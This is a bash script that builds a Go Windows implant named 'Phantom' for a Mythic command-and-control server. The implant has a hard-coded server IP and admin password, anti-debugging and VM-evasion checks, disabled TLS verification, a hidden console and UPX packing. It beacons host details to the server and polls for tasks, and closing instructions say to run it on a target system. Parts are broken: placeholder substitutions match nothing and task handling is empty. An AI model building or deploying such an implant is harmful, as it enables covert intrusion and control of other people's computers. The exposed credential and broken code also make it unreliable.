#!/bin/bash

echo "[+] Phantom Windows Payload Generator - Fixed Version"

# Install dependencies
apt update
apt install -y golang-go upx-ucl gcc-mingw-w64

# Create working directory
mkdir -p /opt/phantom_windows
cd /opt/phantom_windows

# Get server IP (handle IPv6)
SERVER_IP=$(curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')

echo "[+] Creating Phantom payload for Windows..."
echo "[+] Server IP: $SERVER_IP"

# Create fixed Go payload
cat > phantom_windows.go << 'EOF'
package main

import (
    "bytes"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strings"
    "syscall"
    "time"
)

var (
    mythicURL = "https://37.27.249.191:7443"
    username  = "mythic_admin"
    password  = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
    uuid      = generateUUID()
)

type LoginRequest struct {
    Username string `json:"username"`
    Password string `json:"password"`
}

type LoginResponse struct {
    Status      string `json:"status"`
    AccessToken string `json:"access_token"`
}

type CheckinRequest struct {
    UUID         string `json:"uuid"`
    User         string `json:"user"`
    Host         string `json:"host"`
    PID          int    `json:"pid"`
    IP           string `json:"ip"`
    ProcessName  string `json:"process_name"`
    OS           string `json:"os"`
    Architecture string `json:"architecture"`
    PayloadType  string `json:"payload_type"`
}

func antiDebug() bool {
    if runtime.GOOS == "windows" {
        kernel32 := syscall.NewLazyDLL("kernel32.dll")
        isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
        ret, _, _ := isDebuggerPresent.Call()
        return ret != 0
    }
    return false
}

func vmDetection() bool {
    if runtime.GOOS == "windows" {
        cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
        if output, err := cmd.Output(); err == nil {
            outputStr := strings.ToLower(string(output))
            if strings.Contains(outputStr, "vmware") || 
               strings.Contains(outputStr, "virtualbox") ||
               strings.Contains(outputStr, "microsoft corporation") {
                return true
            }
        }
    }
    return false
}

func main() {
    rand.Seed(time.Now().UnixNano())
    
    if antiDebug() {
        os.Exit(0)
    }
    
    if vmDetection() {
        time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
    }
    
    connectToMythic()
}

func connectToMythic() {
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        Timeout: 30 * time.Second,
    }
    
    token := login(client)
    if token == "" {
        return
    }
    
    checkin(client, token)
    
    for {
        getTasks(client, token)
        time.Sleep(time.Duration(5+rand.Intn(10)) * time.Second)
    }
}

func login(client *http.Client) string {
    loginReq := LoginRequest{
        Username: username,
        Password: password,
    }
    
    jsonData, _ := json.Marshal(loginReq)
    resp, err := client.Post(mythicURL+"/auth", "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        return ""
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    var loginResp LoginResponse
    json.Unmarshal(body, &loginResp)
    
    return loginResp.AccessToken
}

func checkin(client *http.Client, token string) bool {
    hostname, _ := os.Hostname()
    user := os.Getenv("USERNAME")
    
    checkinReq := CheckinRequest{
        UUID:         uuid,
        User:         user,
        Host:         hostname,
        PID:          os.Getpid(),
        IP:           getLocalIP(),
        ProcessName:  "phantom.exe",
        OS:           runtime.GOOS,
        Architecture: runtime.GOARCH,
        PayloadType:  "apollo",
    }
    
    jsonData, _ := json.Marshal(checkinReq)
    req, _ := http.NewRequest("POST", mythicURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
    req.Header.Set("Authorization", "Bearer "+token)
    req.Header.Set("Content-Type", "application/json")
    
    resp, err := client.Do(req)
    if err != nil {
        return false
    }
    defer resp.Body.Close()
    
    return resp.StatusCode == 200
}

func getTasks(client *http.Client, token string) {
    req, _ := http.NewRequest("GET", mythicURL+"/api/v1.4/agent_message", nil)
    req.Header.Set("Authorization", "Bearer "+token)
    
    resp, err := client.Do(req)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    if len(body) > 0 {
        // Process tasks here
    }
}

func getLocalIP() string {
    return "127.0.0.1"
}

func generateUUID() string {
    b := make([]byte, 16)
    for i := range b {
        b[i] = byte(rand.Intn(256))
    }
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}
EOF

# Replace SERVER_IP_PLACEHOLDER with actual IP
sed -i "s|SERVER_IP_PLACEHOLDER|$SERVER_IP|g" phantom_windows.go

# Get Mythic password
MYTHIC_PASSWORD=$(sudo /root/Mythic/mythic-cli config get admin_password 2>/dev/null | grep -A1 "MYTHIC_ADMIN_PASSWORD" | tail -1 | awk '{print $1}' || echo "mythic_password")

# Replace password placeholder
sed -i "s|MYTHIC_PASSWORD_PLACEHOLDER|$MYTHIC_PASSWORD|g" phantom_windows.go

echo "[+] Compiling payload for Windows x64..."

# Compile for Windows x64
env GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H windowsgui" -o phantom_x64.exe phantom_windows.go

echo "[+] Compiling payload for Windows x86..."

# Compile for Windows x86
env GOOS=windows GOARCH=386 CGO_ENABLED=0 go build -ldflags="-s -w -H windowsgui" -o phantom_x86.exe phantom_windows.go

# Apply UPX compression if files exist
if [ -f phantom_x64.exe ]; then
    echo "[+] Applying UPX compression to x64..."
    upx --best --lzma phantom_x64.exe 2>/dev/null || echo "[!] UPX compression failed for x64"
fi

if [ -f phantom_x86.exe ]; then
    echo "[+] Applying UPX compression to x86..."
    upx --best --lzma phantom_x86.exe 2>/dev/null || echo "[!] UPX compression failed for x86"
fi

echo ""
echo "[+] Payload generation completed!"
echo ""
echo "Generated files:"
if [ -f phantom_x64.exe ]; then
    echo "  phantom_x64.exe - $(ls -lh phantom_x64.exe | awk '{print $5}')"
fi
if [ -f phantom_x86.exe ]; then
    echo "  phantom_x86.exe - $(ls -lh phantom_x86.exe | awk '{print $5}')"
fi

echo ""
echo "Configuration:"
echo "  Mythic URL: https://$SERVER_IP:7443"
echo "  Password: $MYTHIC_PASSWORD"
echo ""
echo "Features:"
echo "  ✓ Anti-debugging (IsDebuggerPresent)"
echo "  ✓ VM Detection (WMIC)"
echo "  ✓ HTTPS connection to Mythic"
echo "  ✓ UPX compression"
echo "  ✓ Stripped symbols (-s -w)"
echo "  ✓ Hidden console (-H windowsgui)"
echo ""
echo "Usage:"
echo "  1. Copy phantom_x64.exe or phantom_x86.exe to target Windows system"
echo "  2. Execute the file"
echo "  3. Agent will appear in Mythic interface automatically"
echo ""
echo "Access your Mythic interface at: https://$SERVER_IP:7443"
echo "Login: mythic_admin / $MYTHIC_PASSWORD"